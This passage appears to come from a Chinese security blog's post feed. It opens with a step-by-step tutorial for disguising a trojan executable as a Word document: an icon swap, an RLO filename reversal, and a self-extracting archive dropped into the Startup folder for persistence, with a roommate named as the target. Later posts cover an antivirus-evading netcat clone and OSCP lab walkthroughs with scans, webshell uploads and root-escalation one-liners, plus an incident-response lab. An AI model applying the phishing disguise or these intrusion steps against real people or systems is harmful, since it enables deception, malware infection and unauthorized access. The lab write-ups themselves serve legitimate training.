src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210151419.png" alt="image-20240606210151419"></p><p>打开<code>Resource Hacker</code>工具，在File中加载exe木马文件，选择<code>Icon Group</code>，快捷键<code>Ctrl + R</code>打开替换图标</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210433007.png" alt="image-20240606210433007"></p><p>选中word 图标进行替换</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210937912.png" alt="image-20240606210937912"></p><p><code>ctrl + s</code> 保存就可以了，它替换之后可能还是原样，多刷新，或者尝试修改文件名。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606211538439.png" alt="image-20240606211538439"></p><p>再尝试下是否还能连接，没有问题</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606212034856.png" alt="image-20240606212034856"></p><h2 id="三、木马后缀修改"><a href="#三、木马后缀修改" class="headerlink" title="三、木马后缀修改"></a>三、木马后缀修改</h2><p>既然要伪装成word ，我们需要把木马的名称和后缀都改了</p><p>先改名称，如<code>关于评选2024年校级优秀应届大学毕业生的通知.exe</code></p><p>再进行RLO插入，再次对文件重命名，在<code>.exe</code>的前面进行右键，选择插入<code>Unicode 控制字符串(I)</code>。这里是在虚拟机中的示范，在主机上截图不好截（注意：要先重命名，将光标放在.exe 的前面，再右键）</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606213201121.png" alt="image-20240606213201121"></p><p>进行倒叙输入<code>xcod</code>，后缀就变成了<code>docx</code>，再测试一下运行效果，是真不错</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214310982.png" alt="image-20240606214310982"></p><p>这样一个基础的word 文档钓鱼就做好了。</p><p>但是它双击之后并没有出现word文件，还是会让人起疑心。</p><h2 id="四、ZIP-自定义压缩钓鱼"><a href="#四、ZIP-自定义压缩钓鱼" class="headerlink" title="四、ZIP 自定义压缩钓鱼"></a>四、ZIP 自定义压缩钓鱼</h2><p>这里我们需要一篇真正的word 文档，如<code>关于评选2024年校级优秀应届大学毕业生的通知.dock</code>，内容可以写的接近真实一点，不让人怀疑。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214637147.png" alt="image-20240606214637147"></p><p>对木马和word 文档进行压缩，后面的步骤按照图片一步一步来吧</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214752171.png" alt="image-20240606214752171"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214819374.png" alt="image-20240606214819374"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215019098.png" alt="image-20240606215019098"></p><p>这里的路径，可以是任意路径，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 任何人可以写入的文件路径</span><br><span class="line">C:\Windows\Temp</span><br><span class="line"></span><br><span class="line">// 具有权限维持效果的</span><br><span class="line">&quot;C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><p>这里的路径就不多说了，演示效果，我这里用<code>C:\Windows\Temp</code>。如果想用维持效果记得加双引号</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215238441.png" alt="image-20240606215238441"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240607123107078.png" alt="image-20240607123107078"></p><p>这里要把路径和文件名对应起来，如果中间有空格需要用双引号引起来</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215607379.png" alt="image-20240606215607379"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215620154.png" alt="image-20240606215620154"></p><p>就可以了，一路确定即可。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215652648.png" alt="image-20240606215652648"></p><p>变成了<code>test.exe</code></p><p>再重复一二，修改图标和后缀。最终成品</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215957542.png" alt="image-20240606215957542"></p><p>测试效果，这里木马需不进行后缀修改，得原汁原味的exe 才行</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220822819.png" alt="image-20240606220822819"></p><p>同时也能弹出来word<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220852058.png" alt="image-20240606220852058"></p><p>钓鱼嘛，讲究的是愿者上钩，如果室友这次不上当，那就等待下一个时机。当然，不止word，也可以伪装成其他的东西。</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】取代netcat（过杀软）</title>
      <link href="/2024/05/30/Python-tools-netcat/"/>
      <url>/2024/05/30/Python-tools-netcat/</url>
      
        <content type="html"><![CDATA[<h1 id="【Python武器库】取代netcat（过杀软）"><a href="#【Python武器库】取代netcat（过杀软）" class="headerlink" title="【Python武器库】取代netcat（过杀软）"></a>【Python武器库】取代netcat（过杀软）</h1><h2 id="一、netcat-简介"><a href="#一、netcat-简介" class="headerlink" title="一、netcat 简介"></a>一、netcat 简介</h2><p>简称nc，被称为“瑞士军刀”，在网络安全中是一位不可或缺的角色。但如果拿到一太新的服务器，却没有nc，也不具备上网的能力，此时总归是让人有些抓耳的。但如果有python环境的话，却是可以替代nc。此也是一个不错的练习。</p><h2 id="二、实现效果"><a href="#二、实现效果" class="headerlink" title="二、实现效果"></a>二、实现效果</h2><h3 id="1、连接"><a href="#1、连接" class="headerlink" title="1、连接"></a>1、连接</h3><p><img src="/img/Python-tools-netcat/image-20240530182514012.png" alt="image-20240530182514012"></p><h3 id="2、命令执行"><a href="#2、命令执行" class="headerlink" title="2、命令执行"></a>2、命令执行</h3><p>1、创建文件</p><p><img src="/img/Python-tools-netcat/image-20240530182601652.png" alt="image-20240530182601652"></p><p>2、删除文件</p><p><img src="/img/Python-tools-netcat/image-20240530182729163.png" alt="image-20240530182729163"></p><h2 id="三、免杀效果"><a href="#三、免杀效果" class="headerlink" title="三、免杀效果"></a>三、免杀效果</h2><p>同样的路径，只扫描出来nc</p><p><img src="/img/Python-tools-netcat/image-20240530183318162.png" alt="image-20240530183318162"></p><h2 id="四、实战效果"><a href="#四、实战效果" class="headerlink" title="四、实战效果"></a>四、实战效果</h2><p><img src="/img/Python-tools-netcat/image-20240530185113153.png" alt="image-20240530185113153"></p><h2 id="五、代码实现"><a href="#五、代码实现" class="headerlink" title="五、代码实现"></a>五、代码实现</h2><p>由于工具危害性较大，这里只展示代码部分片段</p><p><img src="/img/Python-tools-netcat/image-20240531192217502.png" alt="image-20240531192217502"></p><p>更详细的内容，请前往Python笔记中的项目2</p><p><img src="/img/Python-tools-netcat/image-20240531192300975.png" alt="image-20240531192300975"></p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Katana</title>
      <link href="/2024/05/29/OSCP-Katana/"/>
      <url>/2024/05/29/OSCP-Katana/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Katana"><a href="#【OSCP系列】OSCP靶机—Katana" class="headerlink" title="【OSCP系列】OSCP靶机—Katana"></a>【OSCP系列】OSCP靶机—Katana</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Katana/image-20240529145416227.png" alt="image-20240529145416227"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529145502845.png" alt="image-20240529145502845"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Katana/image-20240529145749652.png" alt="image-20240529145749652"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150206333.png" alt="image-20240529150206333"></p><p><img src="/img/OSCP-Katana/image-20240529150218701.png" alt="image-20240529150218701"></p><p>21、22、80都是常见的服务，139、445是Samba服务，版本号在3.x-4.x，7080 是一个https服务，8715也是一个http服务</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150538337.png" alt="image-20240529150538337"></p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p>刚才nmap 信息收集的时候，ftp并未显示未授权</p><p><img src="/img/OSCP-Katana/image-20240529153121518.png" alt="image-20240529153121518"></p><p>用hydra 进行简单的弱口令爆破，爆破失败</p><p><img src="/img/OSCP-Katana/image-20240529155142725.png" alt="image-20240529155142725"></p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><h3 id="1、80端口首页"><a href="#1、80端口首页" class="headerlink" title="1、80端口首页"></a>1、80端口首页</h3><p>是一个武士军刀</p><p><img src="/img/OSCP-Katana/image-20240529155317401.png" alt="image-20240529155317401"></p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p>啥也没有</p><p><img src="/img/OSCP-Katana/image-20240529160141608.png" alt="image-20240529160141608"></p><p>上其他字典，扫到<code>ebook</code></p><p><img src="/img/OSCP-Katana/image-20240529160854898.png" alt="image-20240529160854898"></p><p>有其他东西了</p><p><img src="/img/OSCP-Katana/image-20240529160931617.png" alt="image-20240529160931617"></p><p>看起来像是一个CMS类型网站，继续扫</p><h3 id="3、admin-php"><a href="#3、admin-php" class="headerlink" title="3、admin.php"></a>3、admin.php</h3><p>像是后台登陆页</p><p><img src="/img/OSCP-Katana/image-20240529161453013.png" alt="image-20240529161453013"></p><h3 id="4、info-php"><a href="#4、info-php" class="headerlink" title="4、info.php"></a>4、info.php</h3><p><code>phpinfo</code>页面</p><p><img src="/img/OSCP-Katana/image-20240529161520241.png" alt="image-20240529161520241"></p><h3 id="5、SQL注入漏洞"><a href="#5、SQL注入漏洞" class="headerlink" title="5、SQL注入漏洞"></a>5、SQL注入漏洞</h3><p><img src="/img/OSCP-Katana/image-20240529162025721.png" alt="image-20240529162025721"></p><p>这里用sqlmap 跑，就不手工了</p><p><img src="/img/OSCP-Katana/image-20240529162118318.png" alt="image-20240529162118318"></p><p>结果非常妙，数据库翻找账号密码</p><p><img src="/img/OSCP-Katana/image-20240529162425561.png" alt="image-20240529162425561"></p><p>昂。。。账号密码这么草率吗？<code>admin:admin</code>登陆后台</p><p><img src="/img/OSCP-Katana/image-20240529162538091.png" alt="image-20240529162538091"></p><h3 id="6、文件上传（失败）"><a href="#6、文件上传（失败）" class="headerlink" title="6、文件上传（失败）"></a>6、文件上传（失败）</h3><p>在修改商品的地方，存在图片上传功能，这里或许存在文件上传</p><p><img src="/img/OSCP-Katana/image-20240529162758380.png" alt="image-20240529162758380"></p><p>到前台看了一下图片的路径在：<code>/ebook/bootstrap/img/mobile_app.jpg</code></p><p><img src="/img/OSCP-Katana/image-20240529162843618.png" alt="image-20240529162843618"></p><p>尝试文件上传</p><p><img src="/img/OSCP-Katana/image-20240529165506341.png" alt="image-20240529165506341"></p><p>上传失败，一度疑似条件竞争，折腾了老大会儿，均失败了</p><h3 id="7、转向8088端口"><a href="#7、转向8088端口" class="headerlink" title="7、转向8088端口"></a>7、转向8088端口</h3><p>目录扫描</p><p><img src="/img/OSCP-Katana/image-20240529165835076.png" alt="image-20240529165835076"></p><h3 id="8、文件上传"><a href="#8、文件上传" class="headerlink" title="8、文件上传"></a>8、文件上传</h3><p>不会又一个失败的吧，尝试一下</p><p><img src="/img/OSCP-Katana/image-20240529165929512.png" alt="image-20240529165929512"></p><p>有两个上传点，上传了一个正常图片和一个恶意图片</p><p><img src="/img/OSCP-Katana/image-20240529170322832.png" alt="image-20240529170322832"></p><p>上传成功了，但是移动到了其他地方，不过这个地方依然像web服务的根目录</p><p><img src="/img/OSCP-Katana/image-20240529170406689.png" alt="image-20240529170406689"></p><p>没想到在<code>8715</code>端口的根目录下发现这张图片，那这就好办了</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>我们在8088端口上传webshell</p><p><img src="/img/OSCP-Katana/image-20240529170529155.png" alt="image-20240529170529155"></p><p>提示报错，但是文件似乎依然移动过去了，蚁剑试试</p><p><img src="/img/OSCP-Katana/image-20240529170654718.png" alt="image-20240529170654718"></p><p>连接成功，同时，我们将shell转移至nc。方法很多，这里就不展示了</p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、-etc-passwd-文件"><a href="#1、-etc-passwd-文件" class="headerlink" title="1、&#x2F;etc&#x2F;passwd 文件"></a>1、&#x2F;etc&#x2F;passwd 文件</h3><p><img src="/img/OSCP-Katana/image-20240529171450269.png" alt="image-20240529171450269"></p><p>昂。？爆破了多大会，一直出不来，先找其他提权方法</p><h3 id="2、getcap查看权限"><a href="#2、getcap查看权限" class="headerlink" title="2、getcap查看权限"></a>2、getcap查看权限</h3><p><img src="/img/OSCP-Katana/image-20240529173805547.png" alt="image-20240529173805547"></p><p>有python</p><p>那直接一句话提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529173844328.png" alt="image-20240529173844328"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-InfosecPrep</title>
      <link href="/2024/05/28/OSCP-InfosecPrep/"/>
      <url>/2024/05/28/OSCP-InfosecPrep/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—InfosecPrep"><a href="#OSCP系列靶机—InfosecPrep" class="headerlink" title="OSCP系列靶机—InfosecPrep"></a>OSCP系列靶机—InfosecPrep</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-InfosecPrep/image-20240527204548647.png" alt="image-20240527204548647"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204618888.png" alt="image-20240527204618888"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527204858405.png" alt="image-20240527204858405"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p 22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204938650.png" alt="image-20240527204938650"></p><p>22端口采用<code>OpenSSH 8.1</code>版本，80端口使用<code>Apache/2.4.41</code>，发现<code>secret.txt</code> 文件，33060使用<code>mysql</code>的某个版本。</p><p>整个机器使用Ubuntu，系统版本在<code>4.15 - 5.8</code></p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527205325618.png" alt="image-20240527205325618"></p><p>80端口使用<code>wordpress</code>框架，发现用户名<code>admin</code>，发现一些csrf 漏洞和进行了一些目录扫描</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、首页"><a href="#1、首页" class="headerlink" title="1、首页"></a>1、首页</h3><p>一个wordpress 网站</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205611390.png" alt="image-20240527205611390"></p><h3 id="2、robots-txt-文件"><a href="#2、robots-txt-文件" class="headerlink" title="2、robots.txt 文件"></a>2、robots.txt 文件</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527205658116.png" alt="image-20240527205658116"></p><h3 id="3、secret-txt-文件"><a href="#3、secret-txt-文件" class="headerlink" title="3、secret.txt 文件"></a>3、secret.txt 文件</h3><p>这个东西，有点像RSA密钥，但是好像被base64加密了</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205719333.png" alt="image-20240527205719333"></p><p>base64解密一下</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205915821.png" alt="image-20240527205915821"></p><p>这下正宗了，确认是某个用户的RSA密钥，保存起来</p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>后面收集了很多信息，均无果，重新回归HTTP ，依次查看网页上有无信息</p><p><img src="/img/OSCP-InfosecPrep/image-20240527215930920.png" alt="image-20240527215930920"></p><p>果然，在首页就已经给了用户名<code>oscp</code>了</p><p><img src="/img/OSCP-InfosecPrep/image-20240527220357448.png" alt="image-20240527220357448"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>查看SUID 文件</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143312921.png" alt="image-20240528143312921"></p><p>嗯？不会吧</p><p>直接 <code>bash -p</code>提权到root</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143522608.png" alt="image-20240528143522608"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—CyberSploit2</title>
      <link href="/2024/05/27/OSCP-cybersploit-2/"/>
      <url>/2024/05/27/OSCP-cybersploit-2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—CyberSploit2"><a href="#OSCP系列靶机—CyberSploit2" class="headerlink" title="OSCP系列靶机—CyberSploit2"></a>OSCP系列靶机—CyberSploit2</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-cybersploit-2/image-20240527140325772.png" alt="image-20240527140325772"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.55</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit-2/image-20240527140404327.png" alt="image-20240527140404327"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140703535.png" alt="image-20240527140703535"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140616869.png" alt="image-20240527140616869"></p><p>22端口使用OpenSSH 8.0版本，80端口使用Apache服务，推测为centos系统</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140711290.png" alt="image-20240527140711290"></p><p>80端口探测到一个<code>icons</code>目录</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、首页"><a href="#1、首页" class="headerlink" title="1、首页"></a>1、首页</h3><p>首页似乎给了几个账户名和密码，收集起来</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141100852.png" alt="image-20240527141100852"></p><h3 id="2、页面源代码"><a href="#2、页面源代码" class="headerlink" title="2、页面源代码"></a>2、页面源代码</h3><p>给了一个<code>ROT47</code>的提示</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141305575.png" alt="image-20240527141305575"></p><p>推测账号密码中<code>D92:=6?5C2 4J36CDA=@:E</code>是一组被编码的数值，解码成功</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141614118.png" alt="image-20240527141614118"></p><h2 id="四、获取SHELL"><a href="#四、获取SHELL" class="headerlink" title="四、获取SHELL"></a>四、获取SHELL</h2><p>对收集的账号密码做成字典，进行ssh爆破</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142240215.png" alt="image-20240527142240215"></p><p>成功获取<code>shailendra</code>用户的权限</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142537822.png" alt="image-20240527142537822"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、查看-etc-passwd"><a href="#1、查看-etc-passwd" class="headerlink" title="1、查看&#x2F;etc&#x2F;passwd"></a>1、查看&#x2F;etc&#x2F;passwd</h3><p>除了<code>shailendra</code>用户之外，还存在一个<code>centos</code>用户</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142634078.png" alt="image-20240527142634078"></p><h3 id="2、hint-txt"><a href="#2、hint-txt" class="headerlink" title="2、hint.txt"></a>2、hint.txt</h3><p>这个提示给的是深处docker当中吗</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142719157.png" alt="image-20240527142719157"></p><p>查看根目录下是否有<code>.dockerenv</code>文件</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142922493.png" alt="image-20240527142922493"></p><p>虽然并未身处docker当中，但是这个机器却有docker环境，甚至还有几个容器存在</p><p><img src="/img/OSCP-cybersploit-2/image-20240527143037623.png" alt="image-20240527143037623"></p><h3 id="3、提权至root"><a href="#3、提权至root" class="headerlink" title="3、提权至root"></a>3、提权至root</h3><p>直接利用docker一句话提权</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】WinServer 2008近源应急OS-1</title>
      <link href="/2024/05/26/Emergency-Nearsource-os-1/"/>
      <url>/2024/05/26/Emergency-Nearsource-os-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-2008近源应急OS-1"><a href="#Windows-Server-2008近源应急OS-1" class="headerlink" title="Windows Server 2008近源应急OS-1"></a>Windows Server 2008近源应急OS-1</h1><p><strong>前景需要：</strong>小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。</p><ol><li>攻击者的外网IP地址</li><li>攻击者的内网跳板IP地址</li><li>攻击者使用的限速软件的md5大写</li><li>攻击者的后门md5大写</li><li>攻击者留下的flag</li></ol><h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><p>在网盘中下载该靶场，解压后在vm中选择【扫描虚拟机】，选择对应的文件夹打开即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240524195332592.png" alt="image-20240524195332592"></p><h2 id="二、攻击者的外网IP地址"><a href="#二、攻击者的外网IP地址" class="headerlink" title="二、攻击者的外网IP地址"></a>二、攻击者的外网IP地址</h2><p>这是一个被近源的主机，因此可能想到的是被钓鱼了</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526160712317.png" alt="image-20240526160712317"></p><p>作为一名老师，桌面上的<code>学校放假通知.doc</code>确是诱惑的一批</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162025296.png" alt="image-20240526162025296"></p><p>在沙箱中跑一下，出来外网IP</p><h2 id="三、攻击者的内网跳板IP地址"><a href="#三、攻击者的内网跳板IP地址" class="headerlink" title="三、攻击者的内网跳板IP地址"></a>三、攻击者的内网跳板IP地址</h2><p>桌面上存在一个phpstudy 修复的bat 文件，但是其目标居然是另一个bat</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162233825.png" alt="image-20240526162233825"></p><p>找到其位置居然啥也没有，打开如下两个选项</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162450318.png" alt="image-20240526162450318"></p><p>查看其内容，内网IP<code>192.168.20.129</code>，端口801</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162521917.png" alt="image-20240526162521917"></p><h2 id="四、攻击者使用的限速软件的md5大写"><a href="#四、攻击者使用的限速软件的md5大写" class="headerlink" title="四、攻击者使用的限速软件的md5大写"></a>四、攻击者使用的限速软件的md5大写</h2><p>在如下的位置</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162731280.png" alt="image-20240526162731280"></p><p>对该工具的简述：限制别人网速</p><img src="/img/Emergency-Nearsource-os-1/image-20240526162814273.png" alt="image-20240526162814273" style="zoom:150%;" /><p>在线网站计算给工具的MD5，后面转成大写即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162934033.png" alt="image-20240526162934033"></p><h2 id="五、攻击者的后门md5大写"><a href="#五、攻击者的后门md5大写" class="headerlink" title="五、攻击者的后门md5大写"></a>五、攻击者的后门md5大写</h2><p>这个后门本以为是文件后门，原来是五次shift 的后门</p><p>五次shfit 后门原理是替换<code>C:\windows\system32\sethc.exe</code> 文件，取该文件的md5大写即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163930460.png" alt="image-20240526163930460"></p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163955586.png" alt="image-20240526163955586"></p><h2 id="六、攻击者留下的flag"><a href="#六、攻击者留下的flag" class="headerlink" title="六、攻击者留下的flag"></a>六、攻击者留下的flag</h2><p>即五次shift 之后出现的flag</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163508759.png" alt="image-20240526163508759"></p><h2 id="七、解题"><a href="#七、解题" class="headerlink" title="七、解题"></a>七、解题</h2><img src="/img/Emergency-Nearsource-os-1/image-20240526164326272.png" alt="image-20240526164326272" style="zoom:150%;" />]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Tomcat 系列漏洞复现</title>
      <link href="/2024/05/24/VulnRep-Tomcat/"/>
      <url>/2024/05/24/VulnRep-Tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Tomcat-系列漏洞复现"><a href="#【漏洞复现】Tomcat-系列漏洞复现" class="headerlink" title="【漏洞复现】Tomcat 系列漏洞复现"></a>【漏洞复现】Tomcat 系列漏洞复现</h1><h2 id="一、任意文件上传（tomcat8）"><a href="#一、任意文件上传（tomcat8）" class="headerlink" title="一、任意文件上传（tomcat8）"></a>一、任意文件上传（tomcat8）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。Tomcat7+权限分为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- manager（后台管理）</span><br><span class="line">  - manager-gui 拥有html页面权限</span><br><span class="line">  - manager-status 拥有查看status的权限</span><br><span class="line">  - manager-script 拥有text接口的权限，和status权限</span><br><span class="line">  - manager-jmx 拥有jmx权限，和status权限</span><br><span class="line">- host-manager（虚拟主机管理）</span><br><span class="line">  - admin-gui 拥有html页面权限</span><br><span class="line">  - admin-script 